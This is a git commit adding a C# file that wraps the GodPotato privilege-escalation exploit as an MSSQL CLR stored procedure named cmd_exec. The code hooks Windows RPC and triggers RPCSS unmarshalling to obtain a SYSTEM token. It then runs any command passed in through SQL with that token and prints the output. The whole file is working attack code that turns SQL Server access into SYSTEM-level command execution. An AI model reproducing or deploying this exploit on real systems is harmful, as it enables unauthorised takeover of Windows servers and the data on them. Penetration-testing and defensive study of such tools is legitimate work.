a14679d3e23141b0b95e4b18cc83f45d8701c311
m57 <m0x3957@gmail.com>
2023-06-19 15:28:52 +0100

    godpotato

---
+++ GodPotato_MSSQL_CLR_DLL/Program.cs
@@ -0,0 +1,67 @@
+﻿using System;
+using System.IO;
+using System.Security.Principal;
+using SharpToken;
+using System.Data;
+using System.Data.SqlClient;
+using System.Data.SqlTypes;
+using Microsoft.SqlServer.Server;
+using System.Diagnostics;
+using System.Text;
+namespace GodPotato
+{
+    public partial class StoredProcedures
+    {
+        [Microsoft.SqlServer.Server.SqlProcedure]
+        public static void cmd_exec(SqlString execCommand)
+        {
+            TextWriter ConsoleWriter = Console.Out;
+
+            try
+            {
+                NativeAPI.GodPotatoContext godPotatoContext = new NativeAPI.GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());
+
+                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule);
+                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr);
+                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr);
+                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount);
+
+                ConsoleWriter.WriteLine("[*] HookRPC");
+                godPotatoContext.HookRPC();
+                ConsoleWriter.WriteLine("[*] Start PipeServer");
+                godPotatoContext.Start();
+
+                NativeAPI.GodPotatoUnmarshalTrigger storageTrigger = new NativeAPI.GodPotatoUnmarshalTrigger(godPotatoContext);
+                try
+                {
+                    ConsoleWriter.WriteLine("[*] Trigger RPCSS");
+                    int hr = storageTrigger.Trigger();
+                    ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);
+
+                }
+                catch (Exception e)
+                {
+                    ConsoleWriter.WriteLine(e);
+                }
+
+                WindowsIdentity systemIdentity = godPotatoContext.GetToken();
+                if (systemIdentity != null)
+                {
+                    ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
+                    TokenuUils.createProcessReadOut(Console.Out, systemIdentity.Token, execCommand.ToString());
+                }
+                else
+                {
+                    ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
+                }
+                godPotatoContext.Restore();
+                godPotatoContext.Stop();
+            }
+            catch (Exception e)
+            {
+                ConsoleWriter.WriteLine("[!] " + e.Message);
+
+            }
+        }
+    }
+}
